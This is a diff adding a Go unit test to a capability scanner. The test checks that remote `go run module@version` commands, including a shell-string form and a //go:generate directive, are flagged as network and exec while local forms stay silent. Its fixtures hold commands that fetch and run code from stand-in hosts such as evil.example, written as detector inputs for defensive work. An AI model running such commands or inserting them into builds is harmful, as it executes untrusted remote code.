@@ -156,6 +156,41 @@ func TestAnalyzeGo_ConstrainedInit(t *testing.T) {
 	}
 }
 
+// TestGoRunRemoteRunner covers OPU-28 Increment 4: `go run <module>@<version>`
+// fetches and runs a remote module (network + exec, the npx analog), while the
+// local `go run` forms carry no version and stay quiet — including inside a
+// //go:generate directive, where a remote runner is now recorded and a local
+// generator remains silent.
+func TestGoRunRemoteRunner(t *testing.T) {
+	remote := []string{
+		"go run example.com/evil/cmd@latest",
+		"go run golang.org/x/tools/cmd/stringer@v0.1.0",
+		"go run -race rsc.io/2fa@latest",
+		"os.system('go run evil.example/x@latest')", // shell-string form
+	}
+	for _, c := range remote {
+		if !scanHasCap(c, CapNetwork) || !scanHasCap(c, CapExec) {
+			t.Errorf("remote %q must be network+exec", c)
+		}
+	}
+	// Local go run runs local code — no fetch, no capability.
+	for _, c := range []string{"go run ./internal/gen", "go run .", "go run main.go", "go run ./cmd/foo"} {
+		if scanHasCap(c, CapNetwork) || scanHasCap(c, CapExec) {
+			t.Errorf("local %q must not reach the network or exec remote code", c)
+		}
+	}
+
+	// Through a //go:generate directive: a remote runner is recorded (network+exec);
+	// a local generator is not (Increment-1 discipline, unchanged).
+	s := AnalyzeGo(map[string]string{"g.go": "//go:generate go run evil.example/gen@latest\n"})
+	if h, ok := goHookByName(s, "go:generate:g.go"); !ok || !h.HasCap(CapNetwork) || !h.HasCap(CapExec) {
+		t.Errorf("//go:generate go run remote@latest should be recorded network+exec, surface=%+v", s.Hooks)
+	}
+	if s := AnalyzeGo(map[string]string{"g.go": "//go:generate go run ./internal/gen\n"}); len(s.Hooks) != 0 {
+		t.Errorf("//go:generate go run ./local must stay silent, got %+v", s.Hooks)
+	}
+}
+
 // TestIsInitEvasionMarker pins the VC-002i gate predicate.
 func TestIsInitEvasionMarker(t *testing.T) {
 	if !IsInitEvasionMarker("init-cap:network") {
